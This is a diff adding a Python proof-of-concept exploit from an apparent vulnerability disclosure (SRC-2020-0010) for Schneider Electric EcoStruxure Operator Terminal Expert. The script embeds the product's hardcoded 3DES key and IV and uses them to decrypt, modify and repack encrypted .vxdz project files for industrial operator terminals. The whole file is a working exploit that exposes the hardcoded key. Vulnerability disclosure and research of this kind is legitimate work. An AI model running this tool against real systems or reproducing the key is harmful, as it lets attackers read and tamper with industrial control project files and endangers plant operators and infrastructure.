@@ -1,0 +1,125 @@
+#!/usr/local/bin/python3
+"""
+Schneider Electric EcoStruxure Operator Terminal Expert Hardcoded Cryptographic Key Information Disclosure Vulnerability
+SRC: SRC-2020-0010
+CVE: N/A
+File: EcoStruxure Operator Terminal Expert V3.1.iso
+SHA1: 386312d68ba5e6a98df24258f2fbcfb2d8c8521b
+Download: https://download.schneider-electric.com/files?p_File_Name=EcoStruxure+Operator+Terminal+Expert+V3.1.iso
+"""
+import os
+import re
+import sys
+import glob
+import zlib
+import zipfile
+from Crypto.Cipher import DES3
+
+# hardcoded values
+key  = [ 202, 20, 221, 52, 225, 154, 5, 123, 111, 219, 11, 199, 145, 27, 200, 129, 254, 222, 253, 119, 213, 134, 72, 78 ]
+iv   = [ 95, 21, 44, 250, 112, 73, 114, 155 ]
+des3 = [ 93, 51, 117, 85, 189, 76, 88, 200, 231, 127 ]
+plen  = 8
+
+def check_equal(iterator):
+   # if all the values are the same then its padding...
+   return len(set(iterator)) <= 1
+
+def _inflate(decoded_data):
+    return zlib.decompress(decoded_data, -15)
+
+def _deflate(string_val):
+    compressed = zlib.compress(string_val)
+    return compressed[2:-4]
+
+def delete_folder(top) :
+    for root, dirs, files in os.walk(top, topdown=False):
+        for name in files:
+            os.remove(os.path.join(root, name))
+        for name in dirs:
+            os.rmdir(os.path.join(root, name))
+    os.rmdir(top)
+
+def decrypt_file(filename):
+    print("(+) unpacking: %s" % filename)
+    decr = DES3.new(bytes(key), DES3.MODE_CBC, bytes(iv))
+    default_data = bytes([8, 8, 8, 8, 8, 8, 8, 8])
+    with open(filename, "rb") as f:
+        if list(f.read(10)) == des3:
+            encrypted = f.read()
+            raw_data = decr.decrypt(encrypted)
+            if not check_equal(list(raw_data)):
+                raw_data = _inflate(raw_data)
+        else:
+            f.seek(0)
+            raw_data = f.read() 
+    # now that we have the decrypted data, let's overwrite the file...
+    with open(filename, "wb") as f:
+        f.write(raw_data)
+
+def encrypt_file(filename):
+    print("(+) packing: %s" % filename)
+    encr = DES3.new(bytes(key), DES3.MODE_CBC, bytes(iv))
+    with open(filename, "rb") as f:
+        packed_data = f.read()
+        if not packed_data == bytes([8, 8, 8, 8, 8, 8, 8, 8]):
+            packed_data = _deflate(packed_data)
+        # padding for encryption, same as schneider
+        pad = plen - (len(packed_data) % plen)
+        # if we just have padding in there, then dont bother adding more padding now...
+        if len(packed_data) != 8:
+            for i in range(0, pad):
+                packed_data += bytes([pad])
+        encr_data = bytes(des3) + encr.encrypt(packed_data)
+    with open(filename, "wb") as f:
+        f.write(encr_data)
+
+def unpack(project):
+    z = os.path.abspath(project)
+    output_dir = os.path.splitext(z)[0]
+    print("(+) unpacking to %s" % output_dir)
+    if os.path.exists(output_dir):
+        print("(-) %s already exists!" % output_dir)
+        return False
+    zip_obj = zipfile.ZipFile(z, 'r')
+    zip_obj.extractall(output_dir)
+    zip_obj.close()
+    # two levels deep, we can do more if we need to
+    for file in list(set(glob.glob(output_dir + '/**/**/*.*', recursive=True))):
+        decrypt_file(file)
+    print("(+) unpacked and decrypted: %s" % project)
+
+def pack(project):
+    z = os.path.abspath(project)
+    output_dir = os.path.splitext(z)[0]
+    # two levels deep, we can do more if we need to
+    for file in list(set(glob.glob(output_dir + '/**/**/*.*', recursive=True))):
+        if os.path.basename(file) != "[Content_Types].xml":
+            encrypt_file(file)
+
+    zf = zipfile.ZipFile(project, "w")
+    for file in list(set(glob.glob(os.path.basename(output_dir) + '/**/**/*.*', recursive=True))):
+        zf.write(file, "/".join(file.strip("/").split('/')[1:]))
+
+    zf.close()
+    delete_folder(output_dir)
+    print("(+) packed and encrypted: %s" % project)
+
+def main():
+    if len(sys.argv) != 3:
+        print("(+) usage: %s <projectfile> [options <pack/unpack>]" % sys.argv[0])
+        print("(+) eg: %s sample.vxdz unpack" % sys.argv[0])
+        print("(+) eg: %s sample.vxdz pack" % sys.argv[0])
+        sys.exit(0)
+    f = sys.argv[1]
+    c = sys.argv[2]
+    if c.lower() == "unpack":
+        unpack(f)
+    elif c.lower() == "pack":
+        pack(f)
+    else:
+        print("(-) invalid option!")
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
